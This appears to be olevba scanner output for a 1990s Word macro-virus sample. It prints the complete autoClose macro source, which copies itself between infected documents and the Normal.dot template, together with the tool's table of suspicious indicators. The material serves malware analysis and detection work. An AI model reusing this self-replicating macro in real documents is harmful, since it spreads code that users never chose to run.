olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.do
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.do - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoClose.bas 
in file: Virus.MSWord.Wazzu.do - OLE stream: 'Macros/VBA/autoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
'   ViruSMacroWord du Bureau I³formatique du SIRPA
'   Virus Anti Virus du 14 juillet 1997
'   v0.1b - Sgt THERY - 18/07/97
'
Public Sub MAIN()
Attribute MAIN.VB_Description = "ViRusMacroWord - Bureau Informatique - SIRPA\r\nVirus Anti Virus de la macro virus111\r\n(c) Sgt THERY - version 0.1b"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoClose.MAIN"
Dim fichier$
Dim model$
Dim Macro$

    On Error GoTo -1: On Error GoTo Erreur
    
    WordBasic.FileSummaryInfo Update:=1
    Dim res As Object: Set res = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo res

    fichier$ = res.Directory + "\" + res.FileName + ":autoClose"
    model$ = "Global:autoClose"
    Macro$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0))

    If UCase(WordBasic.[Right$](Macro$, 10)) = "NORMAL.DOT" Then
        WordBasic.MacroCopy model$, fichier$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fichier$, model$
    End If

    WordBasic.ToolsMacro Name:="virus111", Show:=0, Delete:=1

Erreur:
    On Error GoTo -1: On Error GoTo 0

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

